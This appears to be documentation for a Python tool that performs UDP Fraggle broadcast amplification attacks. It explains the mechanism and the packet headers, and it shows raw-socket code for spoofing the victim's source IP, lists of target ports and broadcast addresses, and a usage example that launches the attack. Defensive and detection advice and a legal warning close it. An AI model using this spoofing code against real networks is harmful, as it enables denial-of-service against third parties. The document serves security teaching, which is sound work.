# UDP Fraggle Attack Documentation

## Overview

The UDP Fraggle attack is a network amplification attack that exploits the UDP protocol by sending UDP packets to broadcast addresses with spoofed source IP addresses. This causes all devices on the broadcast network to respond to the target (victim), creating an amplified traffic attack.

## Attack Mechanism

### How UDP Fraggle Works

1. **Packet Creation**: The attacker crafts UDP packets with spoofed source IP addresses (victim's IP)
2. **Broadcast Targeting**: These packets are sent to broadcast addresses on various networks
3. **Amplification**: All devices on the broadcast network respond to the spoofed source IP
4. **Traffic Multiplication**: The victim receives responses from multiple devices, amplifying the attack traffic

### Technical Details

#### IP Header Structure (RFC 791)
```
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

#### UDP Header Structure (RFC 768)
```
0      7 8     15 16    23 24    31
+--------+--------+--------+--------+
|     Source      |   Destination   |
|      Port       |      Port       |
+--------+--------+--------+--------+
|                 |                 |
|     Length      |    Checksum     |
+--------+--------+--------+--------+
|
|          data octets ...
+---------------- ...
```

## IP Spoofing Implementation

### Source IP Spoofing

The UDP Fraggle attack uses explicit IP spoofing to make packets appear to come from the victim's IP address:

```python
def _create_ip_header(self, source_ip, dest_ip):
    """
    Create IP header with spoofed source IP.
    The source_ip parameter is set to the victim's IP address.
    """
    # IP header fields
    version = 4                    # IPv4
    ihl = 5                        # Internet Header Length
    type_of_service = 0            # Normal service
    total_length = 28              # IP + UDP headers
    identification = random.randint(1, 65535)
    flags = 0                      # No flags
    fragment_offset = 0            # No fragmentation
    ttl = 64                       # Time to live
    protocol = socket.IPPROTO_UDP  # UDP protocol
    
    # Convert spoofed source IP to binary
    source_addr = socket.inet_aton(source_ip)  # VICTIM'S IP
    dest_addr = socket.inet_aton(dest_ip)      # BROADCAST IP
```

### Spoofing Verification

The attack implementation ensures IP spoofing is effective:

1. **Raw Socket Usage**: Uses `SOCK_RAW` with `IP_HDRINCL` to craft custom IP headers
2. **Source IP Control**: Explicitly sets the source IP to the victim's address
3. **Checksum Calculation**: Properly calculates IP and UDP checksums for valid packets
4. **Broadcast Targeting**: Sends to broadcast addresses to maximize amplification

## Target Services

The attack targets common UDP services that respond to broadcast packets:

```python
self.target_services = [
    7,    # Echo Service (RFC 862)
    13,   # Daytime Protocol (RFC 867)
    19,   # Character Generator Protocol (RFC 864)
    37,   # Time Protocol (RFC 868)
    53,   # Domain Name System (RFC 1035)
    123,  # Network Time Protocol (RFC 5905)
    161,  # Simple Network Management Protocol (RFC 1157)
    137,  # NetBIOS Name Service (RFC 1002)
    138,  # NetBIOS Datagram Service (RFC 1002)
]
```

## Broadcast Networks

The attack uses various broadcast addresses for amplification:

```python
self.broadcast_networks = [
    "192.168.1.255",   # Common home network broadcast
    "192.168.0.255",   # Alternative home network
    "10.0.0.255",      # Private network broadcast
    "172.16.0.255",    # Private network broadcast
    "224.0.0.1"        # All systems multicast
]
```

## Implementation Features

### Multi-threading Support
- Configurable number of worker threads for concurrent packet sending
- Thread-safe packet counting and logging
- Graceful thread termination on attack completion

### Logging and Monitoring
- Comprehensive logging of attack progress and errors
- Real-time packet rate monitoring
- Color-coded output for different message types

### Error Handling
- Robust error handling for network failures
- Privilege checking for raw socket operations
- Graceful degradation on socket errors

## Usage Example

```python
# Create UDP Fraggle attack instance
attack = UDPFraggle(
    target_ip="192.168.1.100",      # Victim's IP
    target_port=7,                  # Echo service
    duration=60,                    # 60 seconds
    threads=20,                     # 20 worker threads
    broadcast_networks=[            # Custom broadcast networks
        "192.168.1.255",
        "10.0.0.255"
    ]
)

# Execute the attack
attack.attack()
```

## Security Considerations

### Defensive Measures

1. **Ingress Filtering**: Implement ingress filtering to prevent spoofed packets
2. **Broadcast Blocking**: Disable IP-directed broadcasts on routers
3. **Service Hardening**: Disable unnecessary UDP services
4. **Rate Limiting**: Implement rate limiting on UDP traffic

### Detection Methods

1. **Traffic Analysis**: Monitor for unusual UDP broadcast traffic
2. **Source IP Validation**: Check for impossible source IP addresses
3. **Bandwidth Monitoring**: Watch for sudden spikes in UDP traffic
4. **Service Monitoring**: Monitor targeted UDP services for unusual activity

## Educational Value

This implementation demonstrates:

- Network protocol manipulation
- IP spoofing techniques
- Broadcast amplification attacks
- Multi-threaded network programming
- Raw socket programming
- Network security vulnerabilities

## Legal and Ethical Considerations

⚠️ **WARNING**: This code is for educational purposes only. Using this attack against systems without explicit permission is illegal and unethical. Always:

- Obtain proper authorization before testing
- Use only in controlled environments
- Respect network policies and laws
- Consider the impact on network resources

## References

- RFC 791: Internet Protocol
- RFC 768: User Datagram Protocol
- RFC 862: Echo Protocol
- RFC 867: Daytime Protocol
- RFC 864: Character Generator Protocol
- RFC 1035: Domain Names - Implementation and Specification
- RFC 5905: Network Time Protocol Version 4
